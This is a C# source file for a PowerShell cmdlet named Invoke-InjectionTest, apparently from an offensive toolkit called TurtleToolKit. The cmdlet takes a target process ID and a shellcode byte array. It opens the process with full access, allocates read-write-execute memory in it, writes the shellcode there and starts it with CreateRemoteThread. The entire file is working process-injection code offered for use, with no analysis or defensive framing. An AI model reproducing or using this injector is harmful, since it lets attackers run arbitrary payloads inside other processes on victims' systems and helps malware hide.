using System;
using System.Runtime.InteropServices;
using System.Management.Automation;
using TurtleToolKitManaged;

namespace TurtleToolKit
{
    [Cmdlet(VerbsLifecycle.Invoke, "InjectionTest")] // <- seeting cmdlet name and verbs
    [Alias("TEST")] //<- cmdlet alias
    public class InvokeInjectionTest : Cmdlet
    {
        [Parameter(Mandatory = true)] [Alias("p")] public int pid { get; set; }
        [Parameter(Mandatory = true)] [Alias("s")] public byte[] shellCode { get; set; }

        // Init cmdlet
        protected override void BeginProcessing()
        {
            base.BeginProcessing();
        }

        // Process each item in pipeline
        protected override void ProcessRecord()
        {
            base.ProcessRecord();
            // perform decryption and injection
            if (!ExecuteClassicInjection(shellCode, pid))
            {
                WriteWarning("Failed to execute classic injection");
                return;
            }
            WriteVerbose("Successfully Executed Classic Injection");
        }
        // EndProcessing Used to clean up cmdlet
        protected override void EndProcessing() { base.EndProcessing(); }
        // Handle abnormal termination
        protected override void StopProcessing() { base.StopProcessing(); }

        private bool ExecuteClassicInjection(byte[] shellcode, int processId)
        {
            // to do add better error checking
            try
            {
                int payloadSize = shellcode.Length;
                IntPtr outSize;
                IntPtr hProcessTwo = Win32.OpenProcess(0x001F0FFF, false, processId);
                IntPtr addr = Win32.VirtualAllocEx(hProcessTwo, IntPtr.Zero,(uint)shellcode.Length, 0x3000, 0x40);
                if (!Win32.WriteProcessMemory(hProcessTwo, addr, shellcode, payloadSize, out outSize))
                {
                    Console.WriteLine("failed to write process memory {0}",Marshal.GetLastWin32Error());
                    return false;
                }
                IntPtr hThread = Win32.CreateRemoteThread(hProcessTwo, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine("Failed to execute classic injection");
                Console.WriteLine(e);
                return false;
            }
        }
    }
}
